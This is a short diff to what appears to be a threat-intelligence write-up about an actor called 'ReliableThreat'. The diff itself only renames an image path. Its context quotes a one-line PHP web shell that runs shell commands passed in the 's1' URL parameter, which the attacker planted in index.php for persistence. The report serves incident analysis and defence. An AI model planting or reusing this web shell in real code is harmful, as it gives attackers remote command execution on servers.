@@ -368,7 +368,7 @@ The threat actor also modified a project file for additional persistence. In the
 $testc = $_GET['s1']; echo `$testc`;
 ```
 
-![index.php File changed for additional persistence](../images/ReliableThreat-webshell-indexphp.png)
+![index.php File changed for additional persistence](../images/ReliableThreat-webshell-index.png)
 
 This creates a web shell allowing remote command execution via the `s1` parameter.
 
